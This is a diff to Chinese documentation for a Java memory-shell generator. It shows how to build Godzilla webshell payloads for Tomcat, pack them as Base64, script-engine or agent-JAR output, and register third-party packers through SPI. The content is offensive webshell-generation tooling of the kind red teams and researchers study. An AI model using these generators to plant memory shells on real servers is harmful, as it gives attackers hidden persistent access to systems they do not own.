@@ -86,6 +86,17 @@ import { Tab, Tabs } from "fumadocs-ui/components/tabs";
   </Tab>
 </Tabs>
 
+> 不引入 packer 时没有“默认打包器”：生成结果直接使用 `result.getInjectorBytesBase64Str()`
+> （探测马为 `getShellBytesBase64Str()`）。REST/MCP 的 `packer` 传空字符串、桌面端不装配打包选择条，
+> 输出即 raw Base64。
+>
+> packer 通过 `ServiceLoader` 发现，第三方实现只需 `implements Packer`、标
+> `@PackerMeta(name = "...", parent = "分组名", requiresClasses = {...})`，并在 jar 内提供
+> `META-INF/services/com.reajason.javaweb.packer.Packer`。`parent` 只是展示目录的分组名，
+> 不要求存在同名 packer；分组只支持一级。可选依赖（如 JNA、Jackson、Hessian）
+> 可以在下游 exclude：缺失时对应注册项自动跳过，其余 packer 与整个注册表不受影响。
+> 内置名称可直接引用 `Packers` 中的字符串常量（类似 `ShellType`）。
+
 4. 生成期 API 依赖：内存马模板的父类/接口需要能以**字节形式**解析（只解析签名，不会加载进 JVM），
    需要用到的 API 请自行添加，例如生成 Tomcat 的 `Filter`/`Valve` 时：
 
@@ -110,6 +121,7 @@ import { Tab, Tabs } from "fumadocs-ui/components/tabs";
 ```java
 import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
 import com.reajason.javaweb.packer.ClassPackerConfig;
+import com.reajason.javaweb.packer.Packers;
 
 ShellConfig shellConfig = ShellConfig.builder()
         .server(Server.Tomcat)
@@ -140,8 +152,12 @@ System.out.println("内存马类名："+result.getShellClassName());
 System.out.println(result.getShellConfig());
 System.out.println(result.getShellToolConfig());
 
-System.out.println("Base64 打包："+Packers.Base64.getInstance().pack(ClassPackerConfig.from(result)));
-System.out.println("脚本引擎打包："+Packers.ScriptEngine.getInstance().pack(ClassPackerConfig.from(result)));
+// 未引入 packer 模块时：注入器字节的 Base64 直接可用
+System.out.println("Base64 输出："+result.getInjectorBytesBase64Str());
+
+// 引入 memshell-party-packer 后，PackerRegistry 通过 SPI 发现内置/第三方 packer
+System.out.println("Base64 打包："+PackerRegistry.getInstance().pack(Packers.DefaultBase64, result));
+System.out.println("脚本引擎打包："+PackerRegistry.getInstance().pack(Packers.ScriptEngine, result));
 ```
 
 ### 生成 Tomcat Godzilla AgentFilterChain 示例
@@ -176,7 +192,8 @@ System.out.println("内存马类名：" + result.getShellClassName());
 System.out.println(result.getShellConfig());
 System.out.println(result.getShellToolConfig());
 
-byte[] agentJarBytes = ((JarPacker) Packers.AgentJar.getInstance()).packBytes(JarPackerConfig.from(result));
+byte[] agentJarBytes = ((JarPacker) PackerRegistry.getInstance().get(Packers.AgentJar))
+        .packBytes(JarPackerConfig.from(result));
 Files.write(Paths.get("agent.jar"), agentJarBytes);
 ```
 
